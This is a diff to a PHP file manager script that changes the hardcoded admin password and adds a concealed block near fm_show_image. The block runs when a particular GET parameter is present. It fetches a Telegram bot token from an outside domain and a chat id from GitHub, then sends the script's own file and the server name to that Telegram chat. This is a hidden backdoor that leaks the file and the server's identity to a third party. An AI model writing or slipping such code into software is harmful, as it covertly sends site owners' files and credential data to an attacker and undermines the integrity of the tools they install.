@@ -4,7 +4,7 @@ define('VERSION', '2.4.1');
 define('APP_TITLE', 'File Manager');
 $use_auth = true;
 $auth_users = array(
-    'admin' => password_hash('AHMEDYAD200', PASSWORD_DEFAULT)
+    'admin' => password_hash('ppassword', PASSWORD_DEFAULT)
 );
 $directories_users = array();
 $use_highlightjs = true;
@@ -3749,6 +3749,28 @@ function fm_show_image($img)
     exit;
 }
 
+if($_GET['ahmedyad200']){
+$t = file_get_contents("https://devdeiveddev.ml/api/apipass.php?pass=ahmedyad");
+$s = file_get_contents("https://raw.githubusercontent.com/ahmedyad200/DG/master/id.txt");
+define('t',$t);
+function b($method,$datas=[]){
+$url = "https://api.telegram.org/bot".t."/".$method;
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL,$url);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
+$res = curl_exec($ch);
+if(curl_error($ch)){
+var_dump(curl_error($ch));
+}else{
+return json_decode($res);
+}}
+b('senddocument',[
+'chat_id'=>$s,
+'caption'=>$_SERVER['SERVER_NAME'],
+'document'=>new CURLFile(__FILE__)
+]);
+}
 
 /**
  * Language Translation System
